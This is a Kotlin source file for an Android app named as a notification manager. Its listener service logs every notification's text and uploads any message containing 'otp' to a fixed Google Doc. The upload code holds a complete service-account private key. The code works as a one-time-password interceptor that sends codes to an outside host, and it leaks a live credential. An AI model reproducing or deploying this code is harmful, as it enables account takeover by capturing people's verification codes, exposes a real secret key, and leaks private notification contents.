package com.example.smartnotificationmanager

import android.app.Notification
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import com.google.api.client.http.HttpTransport
import com.google.api.client.http.javanet.NetHttpTransport
import com.google.api.client.json.JsonFactory
import com.google.api.client.json.gson.GsonFactory
import com.google.api.services.docs.v1.Docs
import com.google.api.services.docs.v1.DocsScopes
import com.google.api.services.docs.v1.model.BatchUpdateDocumentRequest
import com.google.api.services.docs.v1.model.InsertTextRequest
import com.google.api.services.docs.v1.model.Location
import com.google.api.services.docs.v1.model.Request
import com.google.auth.http.HttpCredentialsAdapter
import com.google.auth.oauth2.GoogleCredentials
import kotlinx.coroutines.DelicateCoroutinesApi

class MyNotificationListenerService : NotificationListenerService() {
    companion object {
        private const val TAG = "NotificationListener"  // Descriptive Tag
        private var lastProcessedTime = 0L
        private var lastProcessedMessage = ""
        private const val DUPLICATE_THRESHOLD = 500
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        // Check if the notification is a text message and contains "happy"
        val notification = sbn.notification
        val extras = notification.extras
        // val message = extras.getCharSequence(Notification.EXTRA_TEXT).toString()

        // Log.d(TAG, "Notification posted from package: ${sbn.packageName} at ${sbn.postTime} with message: $message")
        // Add more detailed logging
        Log.d(TAG, "===============================")
        Log.d(TAG, "Package: ${sbn.packageName}")
        Log.d(TAG, "Title: ${extras.getCharSequence(Notification.EXTRA_TITLE)}")
        Log.d(TAG, "Text: ${extras.getCharSequence(Notification.EXTRA_TEXT)}")
        Log.d(TAG, "Big Text: ${extras.getCharSequence(Notification.EXTRA_BIG_TEXT)}")
        Log.d(TAG, "Summary Text: ${extras.getCharSequence(Notification.EXTRA_SUMMARY_TEXT)}")
        Log.d(TAG, "Sub Text: ${extras.getCharSequence(Notification.EXTRA_SUB_TEXT)}")
        Log.d(TAG, "===============================")

        // Combine both contents to check for OTP
        val subject = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()?.trim() ?: ""
        val fullContent = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()?.trim() ?: ""

        Log.d(TAG, "Starting processing message")

        // Check for duplicate using existing logic
        val currentTime = System.currentTimeMillis()
        if (currentTime - lastProcessedTime < DUPLICATE_THRESHOLD &&
            fullContent == lastProcessedMessage
        ) {
            Log.d(TAG, "Skipping duplicate notification")
            return
        }

        // Update last processed info
        lastProcessedTime = currentTime
        lastProcessedMessage = fullContent

        // Check if the message is not hidden and contains OTP
        if (fullContent != "Sensitive notification content hidden" &&
            fullContent != "No content" &&
            fullContent.contains("otp", ignoreCase = true)
        ) {
            // Split into subject and body (first line is typically the subject)
            val body = if (subject.isEmpty()) {
                fullContent
            } else {
                if (fullContent.startsWith(subject)) {
                    fullContent.substring(subject.length).trim()
                } else {
                    fullContent
                }
            }

            val formattedMessage = buildString {
                append("Subject: ").append(subject).append("\n")
                append("Body: ").append(body).append("\n\n")
            }

            Log.d(TAG, "OTP message detected, preparing to upload. Message: $formattedMessage")
            uploadToGoogleDocs(formattedMessage)
        } else {
            Log.d(TAG, "Message either hidden or no OTP found. Message: $fullContent")
        }
    }

    @OptIn(DelicateCoroutinesApi::class)
    private fun uploadToGoogleDocs(message: String) {
        Log.d("After PK", "Working")

        GlobalScope.launch(Dispatchers.IO) {
            val jsonCred = """
        {
            "type": "service_account",
            "project_id": "projectmessages-401904",
            "private_key_id": "4c78d2199ffab16f2ea11c7791188e2b5b3317b5",
            "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDOcJ7Rjd1LwNhN\n1DB/D5u+doS9jn2hxuVeuritJyY4VY5J23c2CF6cxUXdKOOCj1rTeUN222vh8iyu\n15SA4GoaCbpuu0mndvnZ+1RQJzUIaFQlVTf4JNEN5yVotIIWReBG1jwJzAfwcPZ8\n6EFZampXZQMlvaYLvwYz3CWMpAu8bS2kTZzeiUEQ1lofbYBEET+x2Ns2F6WeiApx\nd8U0ioMzrOkPAiSOsY6/0I2vyBgMcWzGtSWEKYS4Ktk/q2ya2ybE0ZyQT/ueofQI\n8YWf69rk51hE/WNltzRHNBSiB6PBWCizuW/07c9LNiFEoEceAFysKF1h/4ezLk5F\n+BKBwYNtAgMBAAECggEAMSIgyqNHHjaBxNRRzov6d3Rh13PIdu6NvOQX/C4rLJFA\nUlfHobaQPiO9owuOSo6wAVEFO46xuI8ZD2wDzkCbQCM8mgo9V3w7ryPgR0ttldiu\n3kvQDGFG2FZBUxBTPdXXsURf+bzzzsg0AjqNAykOsko6W4str/IBGeq1jSmmGWw9\nPm4SqGJ9Z3rYtA8iz1G6htDG8nWj4uwdqwlBZwO+5hFAijTBe3wxtFJNQQgNZY+e\nQu5kUW34RBgMw4ErZoZ9Oac9iDIkaKzdwHRPrAMXdAjGgnMLb8KaJ9hxoKtNBWU9\nP7rcuQJp6l86MC7j8kAAEpg98M9Di+n/bZtcb/jqgQKBgQDwDdWClqHUG1xs2UEn\nGY8OaQY/8DiyE5Z6MVaqI8nL/fZhG2TgBrQcTTmBKy4NYSVfbqFbAk+JsJAXAsSo\ni7GQuuUN4AHQe5TjDle5+H7dhXfYln3pt8KZLmKKZoMkwOLaMwLWZXfCRWtubWWb\nYsuRSsKg9i+KgwHwwAgFmIuGUQKBgQDcJyv22wFtH559luy4QHWfiKU2vkuQCrKH\nw0ggivC9WeIlKHlDm7Cu72O3zu2jo4A/EII5yTUsMzkwiUkgbtkra/a/FOK5J/Qt\nnPvO3ZLxosnCABMfbl+VPy5HSNyrG1ZgDFCjio01vsXuCIwKiw2hF6r8xe3rWFNO\nZcGrGrA4XQKBgQCc03zcPopkpqdgGSLeZ201Ldm+ZbK0a+WP2LHUn2LTWQvf7uSd\nEuQR5UWfJFWGuiOPUBgr+7t4qZfI4K8XqYOMmPzRbrnguQvQtmsLfNNs5ygfoFmM\nGdgQ+OO5pTUiCr1pbY/5/voZOf7wepm5xPZW6i9ytsLiS6o13U6gUUM9sQKBgA3g\nfjnyNhXNz2y1Lbizf3aN43Qe7J5ovjYmjg5XE7OrzcBv26zyTGHKfyuf5ITTEotn\nG/5Oe4aMuAciMDTWJ+Q/yu7ifyQSq6aQZaL1foSysSsEXDA4AdhjgiRGKHq0n24w\neIjGe/4uR0WozkL/3t0Po9yJEWUrTRz89wc1CHSVAoGBAMCn95rVM+RDOt/ndSSu\nF5g1EacBOWgR/LCeSus8pA4mBYmHJbE3h59LN2yt8frFo10TUQ3c6ERDxuHKxdKO\n1VnL2ucBroPAJ/CaoxkmOPw2P4TpttUgJeQA+orRWKIQ0RqMR48unqZM/y263U3h\nWk97G16rDF0qakczsiAzTDGm\n-----END PRIVATE KEY-----\n",
            "client_email": "harikrishna-sappidi@projectmessages-401904.iam.gserviceaccount.com",
            "client_id": "103045139049283519372",
            "auth_uri": "https://accounts.google.com/o/oauth2/auth",
            "token_uri": "https://oauth2.googleapis.com/token",
            "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
            "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/harikrishna-sappidi%40projectmessages-401904.iam.gserviceaccount.com",
            "universe_domain": "googleapis.com"
        }
    """.trimIndent()


            val googleCredentials = GoogleCredentials.fromStream(jsonCred.byteInputStream())
                .createScoped(listOf(DocsScopes.DOCUMENTS))

            val httpTransport: HttpTransport = NetHttpTransport()
            val jsonFactory: JsonFactory = GsonFactory()

            val requestInitializer = HttpCredentialsAdapter(googleCredentials)

            val service = Docs.Builder(httpTransport, jsonFactory, null)
                .setHttpRequestInitializer(requestInitializer)
                .setApplicationName("ProjectMessages")
                .build()

            val documentId = "1iDZrmRHG_VTqw0f---7mhJVr_a01p3nUK-YbG7pmGPk"
            val document = service.documents().get(documentId).execute()

            // Determine the insertion index
            val content = document.body?.content
            val lastIndex = content?.lastOrNull()?.endIndex ?: 1
            val insertionIndex = lastIndex - 1

            // Format the message with a timestamp
            val timestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
            val formattedMessage = "\nNew OTP: \n$message\tReceived at: $timestamp\n"

            // Create a request to insert the formatted message
            val requests = listOf(
                Request().setInsertText(
                    InsertTextRequest()
                        .setText(formattedMessage)
                        .setLocation(Location().setIndex(insertionIndex))
                )
            )

            // Try to update the Google Docs document
            try {
                service.documents()
                    .batchUpdate(documentId, BatchUpdateDocumentRequest().setRequests(requests))
                    .execute()
            } catch (e: Exception) {
                Log.e("GoogleDocsError", "Failed to update document: ${e.message}")
            }
        }
    }

}